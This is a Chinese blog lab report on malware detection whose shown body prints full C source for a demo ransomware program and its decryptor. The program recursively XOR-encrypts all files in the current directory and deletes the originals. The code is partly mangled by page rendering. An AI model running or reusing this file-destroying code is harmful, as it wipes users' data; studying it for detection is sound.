<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="mask-icon" href="https://raw.githubusercontent.com/moyuan10086/photo/main/blackground.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"moyuan10086.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究实验背景随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：  设">
<meta property="og:type" content="article">
<meta property="og:title" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究">
<meta property="og:url" content="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/index.html">
<meta property="og:site_name" content="Moyuan&quot;s website">
<meta property="og:description" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究实验背景随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：  设">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-12-12T17:05:14.000Z">
<meta property="article:modified_time" content="2024-12-12T17:05:48.233Z">
<meta property="article:author" content="moyuan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/","path":"2024/12/13/实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究/","title":"实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究 | Moyuan"s website</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Moyuan"s website</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome to my website</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6"><span class="nav-number">1.</span> <span class="nav-text">实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">实验背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92Demo%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.2.</span> <span class="nav-text">第一部分：勒索病毒Demo设计</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-number">1.2.1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.2.2.</span> <span class="nav-text">技术实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91"><span class="nav-number">1.2.3.</span> <span class="nav-text">代码逻辑</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.2.4.</span> <span class="nav-text">安全注意事项</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-1"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include%E2%80%9Dfuncs-h%E2%80%9D"><span class="nav-number"></span> <span class="nav-text">include”funcs.h”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include%E2%80%9Dfuncs-h%E2%80%9D-1"><span class="nav-number"></span> <span class="nav-text">include”funcs.h”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-2"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-3"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pragma-once"><span class="nav-number"></span> <span class="nav-text">pragma once</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pragma-warning-disable-4996"><span class="nav-number"></span> <span class="nav-text">pragma warning(disable : 4996)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-4"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-5"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include%E2%80%9Dfuncs-h%E2%80%9D-2"><span class="nav-number"></span> <span class="nav-text">include”funcs.h”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include%E2%80%9Dfuncs-h%E2%80%9D-3"><span class="nav-number"></span> <span class="nav-text">include”funcs.h”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-6"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include-7"><span class="nav-number"></span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pragma-once-1"><span class="nav-number"></span> <span class="nav-text">pragma once</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pragma-warning-disable-4996-1"><span class="nav-number"></span> <span class="nav-text">pragma warning(disable : 4996)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E9%9A%8F%E6%9C%BA%E7%A7%8D%E5%AD%90%E5%92%8C%E8%AE%BE%E5%A4%87"><span class="nav-number"></span> <span class="nav-text">设置随机种子和设备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE"><span class="nav-number"></span> <span class="nav-text">加载数据</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BC%96%E7%A0%81API"><span class="nav-number"></span> <span class="nav-text">编码API</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%81%9A%E5%90%88%E6%AF%8F%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84API%E5%BA%8F%E5%88%97"><span class="nav-number"></span> <span class="nav-text">聚合每个文件的API序列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E6%A0%87%E7%AD%BE"><span class="nav-number"></span> <span class="nav-text">提取标签</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A1%AB%E5%85%85%E5%BA%8F%E5%88%97"><span class="nav-number"></span> <span class="nav-text">填充序列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BD%AC%E6%8D%A2%E4%B8%BA-PyTorch-Dataset"><span class="nav-number"></span> <span class="nav-text">转换为 PyTorch Dataset</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E9%9B%86"><span class="nav-number"></span> <span class="nav-text">创建数据集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-number"></span> <span class="nav-text">数据加载器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89"><span class="nav-number"></span> <span class="nav-text">模型定义</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B6%85%E5%8F%82%E6%95%B0"><span class="nav-number"></span> <span class="nav-text">超参数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%A8%A1%E5%9E%8B%E3%80%81%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%98%E5%8C%96%E5%99%A8"><span class="nav-number"></span> <span class="nav-text">初始化模型、损失函数和优化器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6"><span class="nav-number"></span> <span class="nav-text">检查是否存在模型文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E9%9B%86%E9%A2%84%E6%B5%8B"><span class="nav-number"></span> <span class="nav-text">测试集预测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6"><span class="nav-number"></span> <span class="nav-text">创建提交文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%86%E6%AF%8F%E4%B8%AA%E7%B1%BB%E5%88%AB%E7%9A%84%E9%A2%84%E6%B5%8B%E6%A6%82%E7%8E%87%E5%A1%AB%E5%85%A5"><span class="nav-number"></span> <span class="nav-text">将每个类别的预测概率填入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%9D%E5%AD%98%E4%B8%BA%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6"><span class="nav-number"></span> <span class="nav-text">保存为提交文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B"><span class="nav-number">0.1.</span> <span class="nav-text">总结与展望</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">moyuan</p>
  <div class="site-description" itemprop="description">prograing or coffee</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/moyuan10086" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;moyuan10086" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2572045628@qq.com" title="E-Mail → mailto:2572045628@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com&#x2F;" rel="noopener" target="_blank">GitHub</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究 | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-13 01:05:14 / 修改时间：01:05:48" itemprop="dateCreated datePublished" datetime="2024-12-13T01:05:14+08:00">2024-12-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"><a href="#实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究" class="headerlink" title="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"></a>实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</h3><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><p>随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：</p>
<ol>
<li>设计一个简单的勒索病毒Demo，了解恶意程序的基本行为。</li>
<li>利用机器学习方法检测恶意程序。</li>
<li>利用深度学习方法检测并分类恶意程序。</li>
</ol>
<h4 id="第一部分：勒索病毒Demo设计"><a href="#第一部分：勒索病毒Demo设计" class="headerlink" title="第一部分：勒索病毒Demo设计"></a>第一部分：勒索病毒Demo设计</h4><h5 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h5><p>利用ChatGPT实现一个勒索病毒的简化模型，模拟文件加密与解密流程，探究恶意程序的行为特征。</p>
<h5 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a><strong>技术实现</strong></h5><ol>
<li>加密功能：<ul>
<li>遍历当前目录及子目录中的所有文件。</li>
<li>使用简单的异或加密算法(<code>XOR</code>)加密文件内容，并将加密后的文件扩展名改为<code>.exe</code>。</li>
<li>删除原始文件，保留加密后的文件。</li>
</ul>
</li>
<li>解密功能：<ul>
<li>遍历加密文件，使用相同的<code>XOR</code>解密逻辑还原原始文件。</li>
<li>删除加密文件，恢复文件原始状态。</li>
</ul>
</li>
</ol>
<h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a><strong>代码逻辑</strong></h5><ul>
<li>文件遍历：使用Windows API递归遍历文件夹。</li>
<li>文件操作：基于<code>FILE*</code>文件指针读写文件。</li>
</ul>
<h5 id="安全注意事项"><a href="#安全注意事项" class="headerlink" title="安全注意事项"></a><strong>安全注意事项</strong></h5><ul>
<li><p><strong>仅供学习使用</strong>，禁止用于任何非法目的。</p>
</li>
<li><p>所有操作应限制在“测试文件夹”中，避免误操作导致数据丢失。</p>
</li>
<li><p><code>encode-main.cpp</code></p>
</li>
<li><p>```</p>
<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include<windows.h></h1><h1 id="include”funcs-h”"><a href="#include”funcs-h”" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1></li>
</ul>
<p>  int main() {<br>      char buff[MAX_PATH];<br>      GetCurrentDirectory(MAX_PATH, buff);<br>      findFile(buff);<br>      printf(“Oh, ho, you got it\n”);<br>      system(“pause”);<br>      return 0;<br>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`encode-funcs.cpp`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="include”funcs-h”-1"><a href="#include”funcs-h”-1" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1><h1 id="include-2"><a href="#include-2" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-3"><a href="#include-3" class="headerlink" title="include"></a>include<windows.h></h1><p>  void findFile(char<em> pathName) {<br>      char currFile[MAX_PATH]; // 暂时存储每个文件名<br>      memset(currFile, 0, MAX_PATH);<br>      sprintf(currFile, “%s\</em>.*”, pathName);<br>      _WIN32_FIND_DATAA findData;<br>      HANDLE hFile = FindFirstFile(currFile, &amp;findData);<br>      if (hFile == INVALID_HANDLE_VALUE)<br>          return;</p>
<pre><code>  int ret = 0;
  while (1) &#123;
      memset(currFile, 0, MAX_PATH);
      sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);
      // 检查文件属性--文件还是文件夹？
      if (findData.cFileName[0] == &#39;.&#39;); //对特殊文件夹不进行处理
      else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数
          findFile(currFile);
      else //否则，处理当前文件
          enCode(currFile);

      ret = FindNextFile(hFile, &amp;findData);
      if (!ret)
          break;
  &#125;
</code></pre><p>  }</p>
<p>  void enCode(char<em> pathFile) {<br>      //打开待加密文件，创建加密后文件<br>      FILE</em> fpSrc = fopen(pathFile, “rb”); //只读字节流<br>      char buff[MAX_PATH];<br>      sprintf(buff, “%s.exe”, pathFile);<br>      FILE* fpDst = fopen(buff, “wb”); //只写字节流</p>
<pre><code>  if (fpSrc == NULL || fpDst == NULL)
      return;
  //以单个字节循环读取待加密文件内容，并写入加密文件中
  char currByte;
  while (1) &#123;
      int count = fread(&amp;currByte, 1, 1, fpSrc);
      if (count &lt; 1) //没读到
          break;
      currByte ^= 0x66; //简单异或加密法
      fwrite(&amp;currByte, 1, 1, fpDst); //写入加密文件
  &#125;
  fclose(fpSrc);
  fclose(fpDst);
  remove(pathFile); //删除原文件
</code></pre><p>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`encode-funcs.h`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="pragma-once"><a href="#pragma-once" class="headerlink" title="pragma once"></a>pragma once</h1><h1 id="pragma-warning-disable-4996"><a href="#pragma-warning-disable-4996" class="headerlink" title="pragma warning(disable : 4996)"></a>pragma warning(disable : 4996)</h1><p>  // 在指定路径下递归寻找所有文件<br>  void findFile(char* pathName);</p>
<p>  // 加密操作<br>  void enCode(char* pathFile);<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`decode-main.cpp`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="include-4"><a href="#include-4" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-5"><a href="#include-5" class="headerlink" title="include"></a>include<windows.h></h1><h1 id="include”funcs-h”-2"><a href="#include”funcs-h”-2" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1><p>  int main() {<br>      char buff[MAX_PATH];<br>      GetCurrentDirectory(MAX_PATH, buff);<br>      findFile(buff);<br>      printf(“Oh, ho, all file recovered！\n”);<br>      system(“pause”);<br>      return 0;<br>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`decode-funcs.cpp`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="include”funcs-h”-3"><a href="#include”funcs-h”-3" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1><h1 id="include-6"><a href="#include-6" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-7"><a href="#include-7" class="headerlink" title="include"></a>include<windows.h></h1><p>  void findFile(char<em> pathName) {<br>      char currFile[MAX_PATH]; // 暂时存储每个文件名<br>      memset(currFile, 0, MAX_PATH);<br>      sprintf(currFile, “%s\</em>.*”, pathName);<br>      _WIN32_FIND_DATAA findData;<br>      HANDLE hFile = FindFirstFile(currFile, &amp;findData);<br>      if (hFile == INVALID_HANDLE_VALUE)<br>          return;</p>
<pre><code>  int ret = 0;
  while (1) &#123;
      memset(currFile, 0, MAX_PATH);
      sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);
      // 检查文件属性--文件还是文件夹？
      if (findData.cFileName[0] == &#39;.&#39;); //对特殊文件夹不进行处理
      else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数
          findFile(currFile);
      else //否则，处理当前文件(安全起见这里仅打印文件名)
          deCode(currFile);

      ret = FindNextFile(hFile, &amp;findData);
      if (!ret)
          break;
  &#125;
</code></pre><p>  }</p>
<p>  void deCode(char<em> pathFile) {<br>      //打开待解密文件，创建解密后文件<br>      FILE</em> fpSrc = fopen(pathFile, “rb”); //只读字节流<br>      char buff[MAX_PATH];<br>      memset(buff, 0, MAX_PATH);<br>      //去掉.exe后缀<br>      if (dropEXE(pathFile, buff) != 0) //如果返回非0，则说明当前文件非.exe结尾，不进行解密处理<br>          return;<br>      FILE* fpDst = fopen(buff, “wb”); //只写字节流<br>      if (fpSrc == NULL || fpDst == NULL)<br>          return;<br>      //以单个字节循环读取待解密文件内容，并写入解密文件中<br>      char currByte;<br>      while (1) {<br>          int count = fread(&amp;currByte, 1, 1, fpSrc);<br>          if (count &lt; 1) //没读到<br>              break;<br>          currByte ^= 0x66; //简单异或解密法<br>          fwrite(&amp;currByte, 1, 1, fpDst); //写入解密文件<br>      }<br>      fclose(fpSrc);<br>      fclose(fpDst);<br>      printf(“Congrat! %s recoveried successfully!\n”, buff);<br>      remove(pathFile);<br>  }</p>
<p>  int dropEXE(char<em> fpSrc, char</em> fpDst) {<br>      int n = strlen(fpSrc);<br>      if (n &lt; 4)<br>          return 1;<br>      char check[5];<br>      for (int i = 0; i &lt; 4; ++i)<br>          check[i] = *(fpSrc + n - 4 + i);<br>      check[4] = ‘\0’;<br>      if (strcmp(check, “.exe”) != 0) {<br>          printf(“sorry, %s is not a .exe file, recovery failed!\n”, fpSrc);<br>          return 1;<br>      }<br>      strncpy(fpDst, fpSrc, n - 4);<br>      return 0;<br>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`decode-funcs.h`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h1 id="pragma-once-1"><a href="#pragma-once-1" class="headerlink" title="pragma once"></a>pragma once</h1><h1 id="pragma-warning-disable-4996-1"><a href="#pragma-warning-disable-4996-1" class="headerlink" title="pragma warning(disable : 4996)"></a>pragma warning(disable : 4996)</h1><p>  // 在指定路径下递归寻找所有文件<br>  void findFile(char* pathName);</p>
